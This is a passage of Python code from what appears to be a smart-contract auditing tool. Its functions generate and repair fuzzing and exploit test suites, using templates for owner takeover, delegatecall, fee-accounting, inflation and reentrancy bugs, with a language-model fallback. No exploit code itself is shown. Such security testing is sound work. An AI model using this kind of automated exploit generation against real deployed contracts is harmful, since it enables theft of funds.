    }}
}}
"""


def _maybe_generate_template_suite(source_manifest, file_map, analysis_result, workspace_info):
    matchers = [
        (_match_owner_takeover_template, _render_owner_takeover_template),
        (_match_delegatecall_vault_template, _render_delegatecall_vault_template),
        (_match_fee_accounting_vault_template, _render_fee_accounting_vault_template),
        (_match_inflation_vault_template, _render_inflation_vault_template),
        (_match_reentrancy_bank_template, _render_reentrancy_bank_template),
    ]

    for match_fn, render_fn in matchers:
        match = match_fn(source_manifest, file_map, analysis_result)
        if match is not None:
            return {
                "mode": "template",
                "template_name": match.get("template_name"),
                "template_reason": match.get("template_reason"),
                "code": render_fn(match, workspace_info),
            }

    return None


def generate_fuzz_test(project_context, analysis_result, source_manifest, file_map, workspace_info):
    invariants = analysis_result.get("invariants", [])
    vulnerabilities = analysis_result.get("vulnerabilities", [])

    if not invariants and not vulnerabilities:
        print("[*] Nothing to test (No invariants or vulns found).")
        return {"success": False, "error": "No invariants or vulnerabilities found."}

    print(
        f"[*] Hacker (L5) generating Fuzzing Suite for {len(invariants)} invariants and {len(vulnerabilities)} exploits..."
    )

    try:
        template_result = _maybe_generate_template_suite(source_manifest, file_map, analysis_result, workspace_info)
        if template_result is not None:
            code = template_result["code"]
            generation_strategy = {
                "mode": template_result["mode"],
                "template_name": template_result.get("template_name"),
                "reason": template_result.get("template_reason"),
                "phase": "initial_generation",
            }
        else:
            prompt = _build_generation_prompt(project_context, analysis_result, source_manifest, workspace_info)
            code = _request_code(prompt)
            generation_strategy = {
                "mode": "llm_fallback",
                "template_name": None,
                "reason": "No deterministic template matched this target; using general LLM generation.",
                "phase": "initial_generation",
            }
        output_path = _write_test_code(code, workspace_info)
        requirement_issues = inspect_generated_code(
            code,
            source_manifest,
            workspace_info["import_prefix"],
            require_invariants=bool(invariants),
            require_exploits=bool(vulnerabilities),
        )

        print(f"[+] L5 Fuzzing Suite Saved: {output_path}")
        return {
            "success": True,
            "code": code,
            "path": output_path,
            "requirement_issues": requirement_issues,
            "generation_strategy": generation_strategy,
        }
    except Exception as e:
        print(f"[!] Hacker Error: {e}")
        return {"success": False, "error": str(e)}


def repair_fuzz_test(
    project_context,
    analysis_result,
    source_manifest,
    file_map,
    workspace_info,
    current_code,
    verification_result,
):
    try:
        template_result = _maybe_generate_template_suite(source_manifest, file_map, analysis_result, workspace_info)
        if template_result is not None:
            code = template_result["code"]
            generation_strategy = {
                "mode": template_result["mode"],
                "template_name": template_result.get("template_name"),
                "reason": template_result.get("template_reason"),
                "phase": "repair_generation",
            }
        else:
            prompt = _build_repair_prompt(
                project_context,
                analysis_result,
                source_manifest,
                workspace_info,
                current_code,
                verification_result,
            )
            code = _request_code(prompt)
            generation_strategy = {
                "mode": "llm_repair",
                "template_name": None,
                "reason": "No deterministic template matched during repair; using LLM repair generation.",
                "phase": "repair_generation",
            }
        output_path = _write_test_code(code, workspace_info)
        requirement_issues = inspect_generated_code(
            code,
            source_manifest,
            workspace_info["import_prefix"],
            require_invariants=bool(analysis_result.get("invariants", [])),
            require_exploits=bool(analysis_result.get("vulnerabilities", [])),
        )

        print(f"[+] Repaired fuzzing suite saved: {output_path}")
        return {
            "success": True,
            "code": code,
            "path": output_path,
            "requirement_issues": requirement_issues,
            "generation_strategy": generation_strategy,
        }
    except Exception as e:
        print(f"[!] Repair Error: {e}")
        return {"success": False, "error": str(e)}
